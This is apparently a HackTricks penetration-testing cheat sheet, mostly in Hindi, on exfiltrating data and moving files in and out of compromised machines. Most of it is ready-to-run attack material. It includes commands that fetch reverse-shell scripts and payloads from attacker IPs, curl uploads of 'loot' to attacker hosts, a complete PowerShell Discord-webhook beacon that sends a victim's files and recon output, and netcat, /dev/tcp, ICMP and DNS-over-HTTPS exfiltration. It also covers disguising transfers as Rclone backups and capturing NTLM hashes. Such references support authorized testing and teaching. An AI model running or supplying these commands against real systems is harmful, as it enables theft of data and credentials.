# Exfiltration

{{#include ../banners/hacktricks-training.md}}

> [!TIP]
> `C:\Users\Public` में loot को stage करने और वैध backups की नकल करने के लिए Rclone से उसे exfiltrate करने के end-to-end उदाहरण के लिए, नीचे दिया गया workflow देखें।

{{#ref}}
../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
{{#endref}}

## जानकारी exfiltrate करने के लिए आमतौर पर whitelist किए गए domains

आम तौर पर whitelist किए गए उन domains को खोजने के लिए [https://lots-project.com/](https://lots-project.com/) देखें जिनका दुरुपयोग किया जा सकता है।

## Copy\&Paste Base64

**Linux**

```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```

**Windows**

```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```

## HTTP

**Linux**

```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```

**Windows**

```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```

### फ़ाइलें अपलोड करें

- [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
- [**GET और POST अनुरोध (हेडर सहित) प्रिंट करने वाला SimpleHttpServer**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
- Python मॉड्यूल [uploadserver](https://pypi.org/project/uploadserver/):

```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```

### **HTTPS Server**

```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
    print(request.get_json())
    return "OK"
if __name__ == "__main__":
    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```

### HTTP/3 / QUIC

यदि egress controls को classic **TCP/443** inspection के लिए tuned किया गया है, लेकिन **UDP/443** के लिए permissive हैं, तो **HTTP/3** को force करने से transfer, TLS-over-TCP के बजाय **QUIC** पर जा सकता है। Attacker endpoint को native HTTP/3 support की ज़रूरत होती है (उदाहरण के लिए, ऐसा reverse proxy या upload endpoint जो पहले से `Alt-Svc: h3` advertise करता हो)।

```bash
# Strict: fail if QUIC/H3 is not available
curl --http3-only -T loot.7z https://attacker-h3.example/upload

# Opportunistic: prefer H3, but fall back to h2/h1 if QUIC fails
curl --http3 -T loot.7z https://attacker-h3.example/upload

# Learn the server's Alt-Svc advertisement and reuse it
curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
```

2025 के एक शोधपत्र (QUIC-Exfil) में पाया गया कि QUIC के encrypted headers और dynamic address changes, TLS- या DNS-आधारित चैनलों की तुलना में, firewall स्तर पर exfiltration का पता लगाना कठिन बना सकते हैं। इसमें server-preferred-address method का प्रदर्शन भी किया गया, जो exfiltration को server-side connection migration जैसा दिखाता है।<sup>[[9]](#references)</sup>

### Pre-signed / delegated object-storage अपलोड

जब आप एक अल्पकालिक **signed URL** बना सकते हैं या प्राप्त कर सकते हैं, तो पीड़ित को केवल एक सामान्य HTTPS client की ज़रूरत होती है। इससे होस्ट पर cloud SDKs या लंबे समय तक चलने वाले credentials इंस्टॉल करने की आवश्यकता नहीं पड़ती।<sup>[[8]](#references)</sup> यह सामान्य object-storage traffic में घुल-मिल भी सकता है।

**Linux / macOS (AWS S3 pre-signed `PUT`)**

```bash
curl -X PUT -T loot.7z \
  -H 'Content-Type: application/octet-stream' \
  'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
```

**Windows PowerShell (AWS S3 pre-signed `PUT`)**

```powershell
Invoke-WebRequest -Method Put -InFile .\loot.7z `
  -ContentType 'application/octet-stream' `
  -Uri $presignedUrl
```

**Azure Blob SAS URL**

```bash
curl -X PUT --data-binary @loot.7z \
  -H 'x-ms-blob-type: BlockBlob' \
  -H 'Content-Type: application/octet-stream' \
  'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
```

Notes:
- Pre-signed URLs / SAS tokens आमतौर पर **path**, **HTTP method**, और **expiration** को सीमित करते हैं।<sup>[[8]](#references)[[10]](#references)</sup>
- Azure Blob `Put Blob` के लिए `x-ms-blob-type: BlockBlob` अनिवार्य है।<sup>[[10]](#references)</sup>
- यह तरीका `curl`, `Invoke-WebRequest`, या किसी ऐसे custom implant के साथ अच्छी तरह काम करता है जो raw HTTPS `PUT` भेज सकता हो।

### goshs

[goshs](https://github.com/patrickhener/goshs), `python3 -m http.server` का एक single-binary विकल्प है।<sup>[[4]](#references)</sup>
यह upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links, और OOB collaboration सुविधाओं (DNS, SMTP, NTLM hash capture) को support करता है।<sup>[[4]](#references)</sup>

```bash
# Serve current directory on port 8000
goshs

# Serve with HTTPS (self-signed)
goshs -s -ss

# Serve with basic auth
goshs -b user:password

# Upload-only mode
goshs -uo

# Read-only mode
goshs -ro

# Capture SMB NTLM hashes
goshs -smb -smb-domain CORP

# DNS callback server
goshs -dns -dns-ip 10.10.10.10

# SMTP callback server
goshs -smtp -smtp-domain [REDACTED]

# Tunnel via localhost.run (no port forwarding needed)
goshs -tunnel
```

## Webhooks (Discord/Slack/Teams) का उपयोग C2 और Data Exfiltration के लिए

Webhooks ऐसे write-only HTTPS endpoints हैं जो JSON और वैकल्पिक file parts स्वीकार करते हैं। इन्हें आमतौर पर trusted SaaS domains के लिए अनुमति दी जाती है और इनके लिए OAuth/API keys की आवश्यकता नहीं होती, इसलिए ये कम friction वाले beaconing और exfiltration के लिए उपयोगी हैं।<sup>[[5]](#references)[[6]](#references)</sup>

मुख्य बातें:
- Endpoint: Discord, https://discord.com/api/webhooks/<id>/<token> का उपयोग करता है
- `payload_json` नाम के part में `{"content":"..."}` और वैकल्पिक `file` नाम के file part(s) के साथ POST `multipart/form-data` भेजें।
- Operator loop का तरीका: समय-समय पर beacon -> directory recon -> लक्षित file exfil -> recon dump -> sleep। HTTP 204 NoContent/200 OK डिलीवरी की पुष्टि करते हैं।

PowerShell PoC (Discord):

```powershell
# 1) Configure webhook and optional target file
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"

# 2) Reuse a single HttpClient
$client = [System.Net.Http.HttpClient]::new()

function Send-DiscordText {
    param([string]$Text)
    $payload = @{ content = $Text } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] text -> $($resp.StatusCode)"
}

function Send-DiscordFile {
    param([string]$Path, [string]$Name)
    if (-not (Test-Path $Path)) { return }
    $bytes = [System.IO.File]::ReadAllBytes($Path)
    $fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
    $json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $mp.Add($fileContent, "file", $Name)
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
}

# 3) Beacon/recon/exfil loop
$ctr = 0
while ($true) {
    $ctr++
    # Beacon
    $beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
    Send-DiscordText -Text $beacon

    # Every 2nd: quick folder listing
    if ($ctr % 2 -eq 0) {
        $dirs = @("Documents","Desktop","Downloads","Pictures")
        $acc = foreach ($d in $dirs) {
            $p = Join-Path $env:USERPROFILE $d
            $items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
            if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
        }
        Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
    }

    # Every 3rd: targeted exfil
    if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }

    # Every 4th: basic recon
    if ($ctr % 4 -eq 0) {
        $who = whoami
        $ip  = ipconfig | Out-String
        $tmp = Join-Path $env:TEMP "recon.txt"
        "whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
        Send-DiscordFile -Path $tmp -Name "recon.txt"
    }

    Start-Sleep -Seconds 20
}
```

नोट्स:
- इसी तरह के पैटर्न अन्य collaboration platforms (Slack/Teams) पर भी उनके incoming webhooks का उपयोग करके लागू होते हैं; URL और JSON schema को उसी अनुसार समायोजित करें।
- Discord Desktop cache artifacts और webhook/API recovery के DFIR के लिए, नीचे दिया गया संबंधित पेज देखें।<sup>[[7]](#references)</sup>

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
{{#endref}}

## Rclone (क्लाउड/ऑब्जेक्ट-स्टोरेज exfiltration)

आधुनिक operators अक्सर **loot को locally stage** करते हैं, फिर [Rclone](https://rclone.org/) का उपयोग करके transfer को सामान्य backup या sync job जैसा दिखाते हैं। एक व्यावहारिक पैटर्न है:

1. एक सामान्य remote (`s3`, `webdav`, `drive`, `mega`, ...)
2. एक `crypt` wrapper, ताकि **contents और filenames client-side encrypt** हों
3. एक वैकल्पिक `chunker` wrapper, यदि provider object-size limits लागू करता हो या आप छोटे upload units चाहते हों

```bash
# 1) Create the storage backend remote (interactive)
rclone config              # ex: remote

# 2) Wrap it with client-side encryption
rclone config              # ex: secret -> remote:path

# 3) Optional: create a chunker overlay for large objects
rclone config              # ex: overlay -> secret:

# 4) Upload staged data
rclone copy /loot secret:$(hostname)-$(date +%F) \
  --transfers 2 --checkers 2 --bwlimit 4M
# If you created the chunker wrapper, upload to overlay:... instead
```

नोट्स:
- `crypt` file contents और names, दोनों को encrypt कर सकता है।<sup>[[3]](#references)</sup>
- `chunker` बड़े files को पारदर्शी रूप से विभाजित करता है और download के दौरान उन्हें फिर से जोड़ता है।<sup>[[11]](#references)</sup>
- `rclone.conf` में `crypt` secrets **obscured** रूप में संग्रहीत होते हैं; यह at-rest पर मज़बूत सुरक्षा नहीं है।<sup>[[3]](#references)</sup> कम समय के operations के लिए, एक समर्पित temporary config इस्तेमाल करें और बाद में उसे हटा दें। अगर आपको इसे अधिक समय तक रखना ज़रूरी हो, तो disk पर बिना सुरक्षा वाला `rclone.conf` छोड़ने के बजाय encrypted config handling (`RCLONE_CONFIG_PASS` / `--password-command`) को प्राथमिकता दें।<sup>[[11]](#references)</sup>
- अगर target पहले से **OneDrive**, **Google Drive**, या **Dropbox** के साथ sync होता है, तो loot को synchronized directory में copy करने से नया transfer binary डालने के बजाय पहले से approved client का लाभ उठाया जा सकता है।

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
{{#endref}}

## FTP

### FTP सर्वर (python)

```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```

### FTP सर्वर (NodeJS)

```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```

### FTP सर्वर (pure-ftp)

```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```

### **Windows** क्लाइंट

```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```

## SMB

Server के रूप में Kali

```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```

या **samba** का उपयोग करके smb share बनाएँ:

```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes
#Start samba
service smbd restart
```

Windows

```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```

### goshs
[goshs](https://github.com/patrickhener/goshs) एक single-binary विकल्प है, जो SMB पर files serve करता है और कनेक्ट होने वाले clients से NTLM hashes capture करता है।<sup>[[4]](#references)</sup>

```bash
# Start SMB server with NTLM hash capture
goshs -smb -smb-domain CORP

# Also works for plain HTTP file serving
goshs
```

## SCP

हमलावर के पास SSHd चल रहा होना चाहिए।

```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```

## SSHFS

यदि पीड़ित के पास SSH है, तो हमलावर पीड़ित की किसी डायरेक्टरी को अपने सिस्टम पर माउंट कर सकता है।

```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```

## NC

```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```

## /dev/tcp

### पीड़ित से फ़ाइल डाउनलोड करें

```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```

### victim पर फ़ाइल अपलोड करें

```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```

**@BinaryShadow\_** को धन्यवाद

## **ICMP**

```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
            print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```

## DNS over HTTPS (DoH)

अगर classic UDP/53 DNS बहुत noisy हो या blocked हो, लेकिन outbound HTTPS को व्यापक रूप से अनुमति हो, तो सामान्य DNS-label exfiltration pattern को public resolver के DoH requests के अंदर लपेटा जा सकता है। हर label को DNS की 63-byte सीमा से काफ़ी छोटा रखें और Base32 जैसे DNS-safe alphabet का उपयोग करें।

```bash
# Encode -> split into DNS-safe labels -> send via DoH
base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
  nl -nrz -w4 -s. | while read chunk; do
    curl --http2 -s \
      -H 'accept: application/dns-json' \
      "https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" \
      >/dev/null
  done
```

`exf.attacker.tld` के authoritative DNS server पर queries को numeric prefix के अनुसार sort करें और Base32 stream को फिर से reconstruct करें। इससे transport classic UDP/53 DNS के बजाय resolver तक HTTPS के अंदर रहता है।<sup>[[2]](#references)</sup>

Full bidirectional DNS tunnel tooling (`iodine`, `dnscat2` आदि) के लिए [tunneling page](tunneling-and-port-forwarding.md) देखें।

## **SMTP**

अगर आप किसी SMTP server पर data भेज सकते हैं, तो data receive करने के लिए Python से SMTP बना सकते हैं:

```bash
sudo python -m smtpd -n -c DebuggingServer :25
```

### goshs

[goshs](https://github.com/patrickhener/goshs) OOB exfiltration scenarios के दौरान email callbacks पकड़ने के लिए तुरंत SMTP server चालू कर सकता है।<sup>[[4]](#references)</sup>

```bash
# Start SMTP callback server
goshs -smtp -smtp-domain [REDACTED]
```

प्राप्त ईमेल और callbacks सीधे टर्मिनल आउटपुट में प्रदर्शित होते हैं।
पूर्ण OOB कवरेज के लिए इसे DNS callback server के साथ जोड़ा जा सकता है:

```bash
# DNS + SMTP combined
goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
```

## TFTP

XP और 2003 में डिफ़ॉल्ट रूप से (अन्य में इसे इंस्टॉलेशन के दौरान स्पष्ट रूप से जोड़ना पड़ता है)

Kali में, **TFTP server शुरू करें**:

```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```

**Python में TFTP सर्वर:**

```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```

**victim** में, Kali server से कनेक्ट करें:

```bash
tftp -i <KALI-IP> get nc.exe
```

## PHP

PHP oneliner से फ़ाइल डाउनलोड करें:

```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```

## VBScript

```bash
Attacker> python -m SimpleHTTPServer 80
```

**पीड़ित**

```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```

## Debug.exe

`debug.exe` प्रोग्राम न केवल binaries का निरीक्षण करने की सुविधा देता है, बल्कि इसमें **hex से उन्हें फिर से बनाने की क्षमता** भी है। इसका मतलब है कि binary का hex देने पर, `debug.exe` binary फ़ाइल बना सकता है। हालांकि, यह ध्यान रखना ज़रूरी है कि debug.exe की **अधिकतम 64 kb आकार की फ़ाइलें असेंबल करने की सीमा** है।<sup>[[1]](#references)</sup>

```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```

फिर टेक्स्ट को windows-shell में कॉपी-पेस्ट करें और nc.exe नाम की एक फ़ाइल बन जाएगी।

## References

- [1] [Windows में फ़ाइलें ट्रांसफ़र करना](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
- [2] [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
- [3] [Rclone `crypt` backend](https://rclone.org/crypt/)
- [4] [goshs](https://github.com/patrickhener/goshs)
- [5] [C2 के रूप में Discord और पीछे छूटे कैश किए गए साक्ष्य](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
- [6] [Discord Webhooks – Webhook निष्पादित करें](https://discord.com/developers/docs/resources/webhook#execute-webhook)
- [7] [Discord Forensic Suite (कैश पार्सर)](https://github.com/jwdfir/discord_cache_parser)
- [8] [Presigned URLs का उपयोग करके ऑब्जेक्ट अपलोड करना - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
- [9] [QUIC-Exfil: डेटा exfiltration हमले करने के लिए QUIC के Server Preferred Address फ़ीचर का शोषण](https://arxiv.org/abs/2505.05292)
- [10] [Put Blob (REST API) - Azure Storage](https://learn.microsoft.com/en-us/rest/api/storageservices/put-blob)
- [11] [Rclone का दस्तावेज़ीकरण](https://rclone.org/docs/#configuration-encryption)
{{#include ../banners/hacktricks-training.md}}
